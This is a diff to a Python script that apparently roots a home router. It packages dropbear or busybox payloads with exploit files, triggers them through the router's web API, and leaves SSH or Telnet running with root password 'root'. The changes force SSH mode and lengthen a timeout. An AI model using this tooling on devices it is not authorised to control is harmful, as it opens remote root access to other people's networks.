@@ -62,12 +62,18 @@ print("mac = {}".format(gw.mac_address))
 gw.ssh_port = 122
 ret = gw.detect_ssh(verbose = 1, interactive = True)
 if ret > 0:
-  die(0, "SSH-server already installed and running")
+  if gw.use_ssh:
+    die(0, "SSH-server already installed and running")
+  else:
+    #die(0, "Telnet-server already running")
+    pass
+
+use_ssh = True
 
 stok = gw.web_login()
 
 dn_tmp = 'tmp/'
-if gw.use_ssh:
+if use_ssh:
   dn_dir = 'data/payload_ssh/'
 else:
   dn_dir = 'data/payload/'
@@ -76,7 +82,7 @@ print("Begin creating a payload for the exploit...")
 fn_payload1 = 'tmp/payload1.tar.gz'
 fn_payload2 = 'tmp/payload2.tar.gz'
 fn_payload3 = 'tmp/payload3.tar.gz'
-if gw.use_ssh:
+if use_ssh:
   fn_pfname = 'dropbearmulti'
 else:
   fn_pfname = 'busybox'
@@ -134,7 +140,7 @@ with tarfile.open(fn_payload3, "w:gz", compresslevel=9) as tar:
   tar.add(fn_pf3, arcname = os.path.basename(fn_pf3))
   tar.add(dn_tmp + fn_executor, arcname = fn_executor)
   tar.add(dn_dir + fn_exploit, arcname = fn_exploit)
-  if gw.use_ssh:
+  if use_ssh:
     tar.add(dn_dir + 'dropbear.uci.cfg', arcname = 'dropbear.uci.cfg')
     tar.add(dn_dir + 'dropbear.init.d.sh', arcname = 'dropbear.init.d.sh')
 
@@ -164,8 +170,9 @@ if (fn_payload3):
 
 time.sleep(1)
 
-if gw.use_ssh:
+if use_ssh:
   print("Running SSH server on port {}...".format(gw.ssh_port))
+  gw.use_ssh = True
 else:
   print("Running TELNET and FTP servers...")
   gw.use_ftp = True
@@ -174,7 +181,7 @@ requests.get(gw.apiurl + "xqnetdetect/netspeed")
 
 time.sleep(0.5)
 gw.passw = 'root'
-gw.ping(contimeout = 12)
+gw.ping(contimeout = 27)
 
 print("")
 print("#### Connection to device {} is OK ####".format(gw.device_name))
